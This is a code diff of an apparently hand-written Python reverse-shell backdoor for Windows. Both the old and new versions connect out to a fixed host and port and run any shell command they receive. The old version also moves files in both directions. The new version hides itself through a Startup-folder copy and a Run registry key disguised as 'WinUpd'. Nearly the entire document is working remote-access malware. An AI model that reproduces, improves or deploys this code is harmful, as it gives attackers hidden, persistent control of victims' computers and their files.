@@ -1,196 +1,85 @@
 import socket
-import os
 import subprocess
+import os
+import shutil
+import winreg
+import sys
 import time
-import zipfile
-import io
-import struct
 
-HOST = 'Atreides'
-PORT = 4444
-BUFFER_SIZE = 1024 * 128
-SEPARATOR = "<sep>"
+def add_to_startup(username):
+    startup_path = rf"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WinUpd.pyw"
+    source_path = os.path.abspath(sys.argv[0]) # Finds where the script is currently running
+    os.makedirs(os.path.dirname(startup_path), exist_ok=True) # Make sure the folder exists
+    shutil.copy2(source_path, startup_path) # Copy the script
 
-def send_message(sock, message):
-    """Send a length-prefixed message"""
-    try:
-        # Send size first
-        message_len = len(message)
-        sock.send(struct.pack('!Q', message_len))
-        
-        # Send data in chunks
-        total_sent = 0
-        while total_sent < message_len:
-            sent = sock.send(message[total_sent:total_sent + BUFFER_SIZE])
-            if sent == 0:
-                raise RuntimeError("Socket connection broken")
-            total_sent += sent
-            
-    except Exception as e:
-        raise RuntimeError(f"Send failed: {str(e)}")
-
-def receive_message(sock):
-    """Receive a length-prefixed message"""
-    try:
-        # Get message size first
-        size_data = sock.recv(8)
-        if not size_data:
-            return None
-        message_len = struct.unpack('!Q', size_data)[0]
-        
-        # Receive data in chunks
-        chunks = []
-        bytes_received = 0
-        while bytes_received < message_len:
-            chunk = sock.recv(min(message_len - bytes_received, BUFFER_SIZE))
-            if not chunk:
-                return None
-            chunks.append(chunk)
-            bytes_received += len(chunk)
-            
-        return b''.join(chunks)
-        
-    except Exception as e:
-        raise RuntimeError(f"Receive failed: {str(e)}")
+def add_to_registry(path):
+    key = winreg.HKEY_CURRENT_USER
+    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
+        winreg.SetValueEx(reg_key, "WinUpd", 0, winreg.REG_SZ, path)
 
 def connect():
-    while True:
+    while True: # Loop means it will listen forever when it runs (and it runs on startup when configured)
         try:
-            sock = socket.socket()
-            sock.connect((HOST, PORT))
-            cwd = os.getcwd().encode()
-            send_message(sock, cwd)
-            return sock
+            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client.connect(('192.168.8.121', 10112)) # Get connected up
+            return client
+            break
         except Exception as e:
             print(f"Connection failed: {e}")
             time.sleep(1)
 
-def create_zip_file(path):
-    """Create a zip file containing a directory"""
-    temp_zip = io.BytesIO()
-    with zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
-        if os.path.isfile(path):
-            # Single file
-            zipf.write(path, os.path.basename(path))
-        else:
-            # Directory
-            for root, _, files in os.walk(path):
-                for file in files:
-                    file_path = os.path.join(root, file)
-                    arcname = os.path.relpath(file_path, os.path.dirname(path))
-                    zipf.write(file_path, arcname)
-    return temp_zip.getvalue()
+def recieve():
+    client = connect()
 
-def extract_zip_file(zip_data, extract_path):
-    """Extract a zip file to the specified path"""
-    with io.BytesIO(zip_data) as zip_buffer:
-        with zipfile.ZipFile(zip_buffer) as zip_file:
-            zip_file.extractall(extract_path)
-
-def handle_file_transfer(sock, path, mode='upload'):
-    try:
-        if mode == 'upload':
-            # Receiving from server
-            data = receive_message(sock)
-            if not data:
-                return "Transfer failed - no data received"
-                
-            parent_dir = os.path.dirname(path)
-            if parent_dir:
-                os.makedirs(parent_dir, exist_ok=True)
-                
-            try:
-                # Try to extract as zip
-                extract_zip_file(data, os.path.dirname(path) if os.path.dirname(path) else '.')
-                return f"Successfully received directory to {path}"
-            except zipfile.BadZipFile:
-                # Not a zip, treat as single file
-                with open(path, 'wb') as f:
-                    f.write(data)
-                return f"Successfully received file {path}"
-                
-        else:  # download
-            if not os.path.exists(path):
-                return f"Path {path} does not exist"
-                
-            # Create zip for both files and directories
-            zip_data = create_zip_file(path)
-            send_message(sock, zip_data)
-            
-            return f"Successfully sent {'directory' if os.path.isdir(path) else 'file'} {path}"
-            
-    except Exception as e:
-        return f"Transfer failed: {str(e)}"
-
-def execute_command(command):
-    try:
-        process = subprocess.Popen(
-            command,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            shell=True,
-            text=True,
-            creationflags=subprocess.CREATE_NO_WINDOW
-        )
-        
-        try:
-            stdout, stderr = process.communicate(timeout=30)
-            if stderr:
-                return stderr
-            return stdout if stdout else "Command executed successfully"
-        except subprocess.TimeoutExpired:
-            process.kill()
-            return "Command execution timed out"
-            
-    except Exception as e:
-        return str(e)
-
-def main():
-    sock = connect()
-    
     while True:
         try:
-            command_bytes = receive_message(sock)
-            if not command_bytes:
-                raise RuntimeError("Connection lost")
-                
-            command = command_bytes.decode()
-            
-            if command.lower() == "exit":
-                sock.close()
-                sock = connect()
-                continue
-                
-            split_command = command.split()
-            command_type = split_command[0].lower() if split_command else ""
-            
-            if command_type == "cd":
+            command = client.recv(65536).decode() # Get whatever command was sent through
+            if command.lower() == 'exit': # Break
+                break
+            elif command.startswith('cd '):
                 try:
-                    os.chdir(' '.join(split_command[1:]))
-                    output = ""
+                    new_dir = command.strip('cd ').strip() # 1st strip seperates cd from say /home/kali. 2nd strip just removes whitespace from the start and finish of the /home/kali
+                    os.chdir(new_dir) # cd text that was passed through is actually not used. Instead a builting chdir function pulls your /home/kali and changes to it
+                    output = f'Changed directory to: {os.getcwd()}\n' # Output must be printed with a get working directory so that the program doesn't hit a standstill after a cd
+                except Exception as e:
+                    output = str(e) # If an error then send that as the output to the server
+            elif command.startswith('cp '):
+                try:
+                    parts = command.split()
+                    if len(parts) >= 3:
+                        source = parts[1]
+                        destination = parts[2]
+                        
+                        if os.path.isdir(source):
+                            shutil.copytree(source, destination)
+                            output = f"Directory copied: {source} -> {destination}\n"
+                        else:
+                            shutil.copy2(source, destination)
+                            output = f"File copied: {source} -> {destination}\n"
+                    else:
+                        output = "Usage: cp source destination\n"
+                except Exception as e:
+                    output = f"cp: {str(e)}\n"
+            elif command == "pwd":
+                output = os.getcwd()
+            elif command.startswith('apply '):
+                try:
+                    username = command.removeprefix('apply ').strip()
+                    script_path = rf"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WinUpd.pyw"
+                    add_to_registry(script_path)
+                    add_to_startup(username)
+                    output = f'Registered {script_path} for registry startup.'
                 except Exception as e:
                     output = str(e)
-                    
-            elif command_type in ("upload", "download"):
-                if len(split_command) < 2:
-                    output = "Missing file path"
-                else:
-                    output = handle_file_transfer(
-                        sock, 
-                        split_command[1],
-                        command_type
-                    )
-                    
             else:
-                output = execute_command(command)
-            
-            message = f"{output}{SEPARATOR}{os.getcwd()}".encode()
-            send_message(sock, message)
-            
+                try:
+                    output = f'$ > {subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True).decode()}' # An additional $ > is here because some text must be printed to stop the program hitting another standstill when running certain commands that do not print any output. For example mkdir (foldername) prints nothing and so the server is left waiting for some form of output forever
+                except Exception as e:
+                    output = str(e)
+            client.send(output.encode()) # Send that shit off
         except Exception as e:
-            print(f"Error: {e}")
-            sock.close()
-            sock = connect()
+            client.close()
+            client = connect()
 
-if __name__ == "__main__":
-    main()
+recieve()
